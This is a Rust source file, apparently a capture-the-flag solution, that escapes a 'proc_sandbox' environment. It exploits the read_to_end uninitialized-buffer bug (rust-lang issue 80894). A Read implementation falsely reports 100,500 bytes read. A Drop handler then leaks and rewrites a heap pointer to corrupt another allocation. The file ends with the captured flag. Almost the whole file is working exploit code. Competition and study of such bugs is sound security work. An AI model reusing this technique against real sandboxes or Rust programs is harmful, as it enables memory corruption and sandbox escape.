/*
    Copyright 2021 Google LLC

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        https://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
*/
#![no_std]
use proc_sandbox::sandbox;

#[sandbox]
pub mod user {
    use prelude::{log, Box, IoResult, Read, Service, Vec};
    pub struct State;
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new(Self)
        }
    }
    struct MyRead {
        first: bool,
    }

    impl MyRead {
        pub fn new() -> Self {
            MyRead { first: true }
        }
    }

    impl Read for MyRead {
        fn read(&mut self, _buf: &mut [u8]) -> IoResult<usize> {
            if self.first {
                self.first = false;
                Ok(100500)
            } else {
                Ok(0)
            }
        }
    }

    struct VecWrapper {
        inner: Vec<u8>,
    }

    impl VecWrapper {
        pub fn new() -> Self {
            VecWrapper { inner: Vec::new() }
        }
    }

    impl Drop for VecWrapper {
        fn drop(&mut self) {
            let mut victim: Box<Vec<u8>> = Box::new(Vec::new());
            victim.resize(0x200, 0);
            let mut victim_ptr: u64 = self.inner[0x130] as u64
                | ((self.inner[0x131] as u64) << 8)
                | ((self.inner[0x132] as u64) << 16)
                | ((self.inner[0x133] as u64) << 24)
                | ((self.inner[0x134] as u64) << 32)
                | ((self.inner[0x135] as u64) << 40)
                | ((self.inner[0x136] as u64) << 48)
                | ((self.inner[0x137] as u64) << 56);
            log!("{:x}", victim_ptr);
            victim_ptr -= 0x200;
            self.inner[0x130] = (victim_ptr & 0xff) as u8;
            self.inner[0x131] = ((victim_ptr >> 8) & 0xff) as u8;
            self.inner[0x132] = ((victim_ptr >> 16) & 0xff) as u8;
            self.inner[0x133] = ((victim_ptr >> 24) & 0xff) as u8;
            self.inner[0x134] = ((victim_ptr >> 32) & 0xff) as u8;
            self.inner[0x135] = ((victim_ptr >> 40) & 0xff) as u8;
            self.inner[0x136] = ((victim_ptr >> 48) & 0xff) as u8;
            self.inner[0x137] = ((victim_ptr >> 56) & 0xff) as u8;
            log!("{:?}", victim);
        }
    }

    impl Service for State {
        fn handle(&mut self, _: &str) {
            let mut vec = VecWrapper::new();
            let mut read = MyRead::new();
            read.read_to_end(&mut vec.inner).unwrap();
        }
    }
}

/*
https://github.com/rust-lang/rust/issues/80894
CTF{s4ndb0x1n9_s0urc3_1s_h4rd_ev3n_1n_rus7}
 */